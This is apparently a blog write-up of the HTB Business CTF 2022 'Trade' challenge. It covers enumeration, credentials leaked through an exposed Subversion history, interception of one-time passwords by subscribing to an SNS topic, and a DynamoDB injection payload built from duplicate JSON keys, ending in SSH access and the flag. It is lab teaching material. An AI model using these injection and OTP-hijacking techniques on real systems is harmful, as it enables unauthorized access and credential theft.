---
layout: post
title: HTB Business CTF 2022 Writeup - Trade
date: 2022-07-17
type: post
tags:
- Writeup
- Hacking
- BusinessCTF
- CTF
permalink: /2022/07/HTBBusinessCTF/Trade
img: 2022/07/HTBBusinessCTF/Trade/Trade.png
---

In this challenge, we have the hack a forum where APT groups exchange exploits.

> With increasing breaches there has been equal increased demand for exploits and compromised hosts. Dark APT group has released an online store to sell such digital equipment. Being part of defense operations can you help disrupting their service ?


## Enumeration

When I launched the challenge, I was given an IP. I used RustScan to check for opened ports.

```bash
$ rustscan -a 10.129.240.32 -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.240.32:22
Open 10.129.240.32:80
Open 10.129.240.32:3690
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
                                                                                                                                                                                                                                           [~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 20:27 EDT

22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN
1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIG
PZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp   open  http     syn-ack Apache httpd 2.4.41
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Monkey Backdoorz
3690/tcp open  svnserve syn-ack Subversion
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There were three opened ports on the provided machine.
- 22 - SSH
- 80 - HTTP
- 3690 - Subversion

I opened a browser to look at the website. It just contained a login screen.

![Login](/assets/images/2022/07/HTBBusinessCTF/Trade/Login.png "Login")

I launched Feroxbuster to look for hidden files, but it did not find anything.

## Subversion

Without credentials to the site, I could not do much. I started looking at the [Subversion](https://subversion.apache.org/) repositories.

I had not used svn in many years. So I had to search for almost every command.

First I listed the repository on the server.

```bash
$ svn list svn://10.129.240.32
store/
```

It contained one repository. I got a local version of the repository.

```bash
$ svn checkout svn://10.129.240.32/store
A    store/README.md
A    store/dynamo.py
A    store/sns.py
Checked out revision 5.
```

The provided code was creating a [DynamoDB](https://aws.amazon.com/dynamodb/) table and inserting a user in it. It also published to [Amazon Simple Notification Service (SNS)](https://aws.amazon.com/sns/). And saved some logs on [Amazon Simple Storage Service (S3) ](https://aws.amazon.com/s3/).

The `dynamo.py` file contained some credentials.

```python
client.put_item(TableName='users',
	Item={
		'username': {
			'S': 'marcus'
		},
		'password': {
			'S': 'dFc42BvUs02'
		},
	}
)
```

I used those to connect to the site. It worked, but I needed a one-time password to finish authenticating.

![OTP Request](/assets/images/2022/07/HTBBusinessCTF/Trade/OTPRequest.png "OTP Request")

I kept digging in the svn repository. I checked previous versions of the code to see if they contained useful information.

```bash
$ svn diff -r r2
...
-access_key = 'AKIA5M34BDN8GCJGRFFB'
-secret_access_key_id = 'cnVpO1/EjpR7pger+ELweFdbzKcyDe+5F3tbGOdn'
```

The second revision of the code contained AWS credentials. I tried to use them with the [AWS Command Line Interface (CLI)](https://aws.amazon.com/cli/). They were not valid. I looked at the code where they were used.


```python
s3 = boto3.client('s3', region_name=region, endpoint_url='http://cloud.htb',aws_access_key_id=access_key,aws_secret_access_key=secret_access_key_id)
```

It was using a private cloud located at `cloud.htb`. I added that to my hosts file and defined an alias so the AWS CLI would hit that cloud.

```bash
alias aws='aws --endpoint-url http://cloud.htb'
```

I tried to use them again.

```bash
$ aws dynamodb get-item --table-name users --key '{"username": {"S": "marcus"}}'

An error occurred (403) when calling the GetItem operation: User arn:aws:iam::000000000000:user/tom is not authorized to perform this action
```

The access key did not have permission to use DynamoDB. I tried it on S3 also and got the same result.

Since the code was using SNS. I tried to list the topics.

```bash
$ aws sns list-topics
{
    "Topics": [
        {
            "TopicArn": "arn:aws:sns:us-east-2:000000000000:otp"
        }
    ]
}
```

That worked. I was able to access one SNS topic. I subscribed to it, asking AWS to send notifications to my machine via HTTP.


```bash
$ aws sns subscribe --topic-arn arn:aws:sns:us-east-2:000000000000:otp --protocol http --notification-endpoint http://10.10.14.25 --attributes '{"RawMessageDelivery": "true"}'
{
    "SubscriptionArn": "arn:aws:sns:us-east-2:000000000000:otp:0350e024-5b35-4861-87d1-8d8072943b5f"
}
```

I started a netcat listener and reconnected on the website. Netcat got a hit with a token to use in the OTP.

```bash
$ nc -klvnp 80
Listening on 0.0.0.0 80

Connection received on 10.129.198.36 55930
POST / HTTP/1.1
Host: 10.10.14.25
User-Agent: Amazon Simple Notification Service Agent
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: text/plain
x-amz-sns-message-type: Notification
x-amz-sns-topic-arn: arn:aws:sns:us-east-2:000000000000:otp
x-amz-sns-subscription-arn: arn:aws:sns:us-east-2:000000000000:otp:0350e024-5b35-4861-87d1-8d8072943b5f
Content-Length: 529

{"Type": "Notification", "MessageId": "593c714c-4031-4bd9-881d-fb82c7d478d1", "TopicArn": "arn:aws:sns:us-east-2:000000000000:otp", "Message": "{\"otp\": \"98467627\"}", "Timestamp": "2022-07-17T11:30:40.906Z", "SignatureVersion": "1", "Signature": "EXAMPLEpH+..", "SigningCertURL": "https://sns.us-east-1.amazonaws.com/SimpleNotificationService-0000000000000000000000.pem", "UnsubscribeURL": "http://localhost:4566/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-2:000000000000:otp:0350e024-5b35-4861-87d1-8d8072943b5f"}
S: 0 Window: 3 Pane: 1
```

I used the token and I was in.

![Logged In](/assets/images/2022/07/HTBBusinessCTF/Trade/LoggedIn.png "Logged In")

## Injection

Once connected, I looked around the website. The cart did not appear to do much. I could add and remove items from it, but there was no checkout.

There was a search page.

![Search Page](/assets/images/2022/07/HTBBusinessCTF/Trade/SearchPage.png "Search Page")

I tried different searches and found that if I sent a double quote, the page would crash.

![Crash the Search Page](/assets/images/2022/07/HTBBusinessCTF/Trade/CrashTheSearchPage.png "Crash the Search Page")

The page was vulnerable to [DynamoDB Injection](https://medium.com/appsecengineer/dynamodb-injection-1db99c2454ac).

I looked for a payload that would always return true. As the code was already sending a ComparisonOperator and the AttributeValueList, I needed to find a way to change them.

```
{"servername": {"ComparisonOperator": "EQ","AttributeValueList": [{"S": "MY PAYLOAD"}]}}
```

I tested the Python JSON parser and saw that if an attribute is repeated, it keeps only the last value.

```python
>>> import json
>>> value = '{"servername": {"ComparisonOperator": "EQ","AttributeValueList": [{"S": "*"}], "ComparisonOperator": "GT", "AttributeValueList": [{"S": "*"}]}}'
>>> parsed = json.loads(value)
>>> print(parsed)
{'servername': {'ComparisonOperator': 'GT', 'AttributeValueList': [{'S': '*'}]}}
```

To produce the previous JSON, I sent this payload.

```
*"}], "ComparisonOperator": "GT", "AttributeValueList": [{"S": "*
```

It worked. I got a page with multiple credentials listed. 

![Injection](/assets/images/2022/07/HTBBusinessCTF/Trade/Injection.png "Injection")

The SSH port was open. So I tried the different credentials from the page. Mario's password worked.

![Mario's Credentials](/assets/images/2022/07/HTBBusinessCTF/Trade/MariosCredentials.png "Mario's Credentials")

The flag was in the home folder.

```
$ ssh mario@cloud.htb
mario@cloud.htb's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)


mario@trade:~$ ls -la
total 28
drwxr-xr-x 3 mario mario 4096 Jul  6 03:24 .
drwxr-xr-x 3 root  root  4096 Jun 10 06:13 ..
lrwxrwxrwx 1 root  root     9 Jul  6 03:24 .bash_history -> /dev/null
-rw-r--r-- 1 mario mario  220 Jun 10 06:13 .bash_logout
-rw-r--r-- 1 mario mario 3771 Jun 10 06:13 .bashrc
drwx------ 2 mario mario 4096 Jun 10 06:57 .cache
-rw-r----- 1 mario mario   41 Jun 10 06:14 flag.txt
-rw-r--r-- 1 mario mario  807 Jun 10 06:13 .profile

mario@trade:~$ cat flag.txt
HTB{dyn4m0_1nj3ct10ns_4r3_w31rd_4bFgc1!}
```